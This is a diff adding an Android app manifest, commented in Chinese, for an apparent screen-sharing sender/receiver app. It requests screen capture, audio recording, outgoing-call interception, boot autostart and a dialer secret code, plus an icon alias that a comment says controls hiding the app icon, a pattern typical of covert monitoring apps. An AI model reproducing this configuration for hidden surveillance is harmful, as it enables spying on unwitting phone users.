@@ -1,0 +1,170 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.chuan.android_combined"
+    android:versionCode="1"
+    android:versionName="1.0" >
+
+    <uses-sdk
+        android:minSdkVersion="24"
+        android:targetSdkVersion="35" />
+
+    <!-- 必要的权限 -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.REORDER_TASKS" />
+
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <permission
+        android:name="com.chuan.android_combined.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+        android:protectionLevel="signature" />
+
+    <uses-permission android:name="com.chuan.android_combined.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+
+    <application
+        android:allowBackup="true"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+        android:debuggable="true"
+        android:extractNativeLibs="false"
+        android:icon="@android:drawable/ic_menu_share"
+        android:label="@string/app_name"
+        android:roundIcon="@android:drawable/ic_menu_share"
+        android:supportsRtl="true"
+        android:testOnly="true"
+        android:theme="@style/Theme.ScreenLink" >
+
+        <!-- 主调度界面作为启动入口 -->
+        <activity
+            android:name="com.chuan.android_combined.MainDispatcherActivity"
+            android:configChanges="orientation|screenSize"
+            android:exported="true" >
+        </activity> <!-- 为MainActivity创建一个别名，用于控制应用图标的显示和隐藏 -->
+        <activity-alias
+            android:name="com.chuan.android_combined.LauncherActivity"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@android:drawable/ic_menu_share"
+            android:label="@string/app_name"
+            android:targetActivity="com.chuan.android_combined.MainDispatcherActivity" >
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- 发送端界面 -->
+        <activity
+            android:name="com.chuan.android_combined.SenderMainActivity"
+            android:configChanges="orientation|screenSize"
+            android:exported="false" />
+
+        <!-- 接收端界面 -->
+        <activity
+            android:name="com.chuan.android_combined.ReceiverMainActivity"
+            android:configChanges="orientation|screenSize"
+            android:exported="false" />
+
+        <!-- 屏幕捕获服务 -->
+        <service
+            android:name="com.chuan.android_combined.ScreenCaptureService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection"
+            android:stopWithTask="false" />
+
+        <!-- 后台服务 -->
+        <service
+            android:name="com.chuan.android_combined.BackgroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false" />
+
+        <!-- 添加广播接收器，用于监听拨号事件 -->
+        <receiver
+            android:name="com.chuan.android_combined.PhoneCallReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_STICKY" >
+            <intent-filter android:priority="1000" >
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+
+            <!-- 添加对秘密代码的处理 -->
+            <intent-filter android:priority="1000" >
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+
+                <data
+                    android:host="12345"
+                    android:scheme="android_secret_code" />
+            </intent-filter>
+
+            <!-- 添加开机自启动处理 -->
+            <intent-filter android:priority="1000" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:name="androidx.compose.ui.tooling.PreviewActivity"
+            android:exported="true" />
+        <activity
+            android:name="androidx.activity.ComponentActivity"
+            android:exported="true" />
+
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="com.chuan.android_combined.androidx-startup"
+            android:exported="false" >
+            <meta-data
+                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+                android:value="androidx.startup" />
+            <meta-data
+                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+                android:value="androidx.startup" />
+            <meta-data
+                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
+                android:value="androidx.startup" />
+        </provider>
+
+        <receiver
+            android:name="androidx.profileinstaller.ProfileInstallReceiver"
+            android:directBootAware="false"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.DUMP" >
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+</manifest>
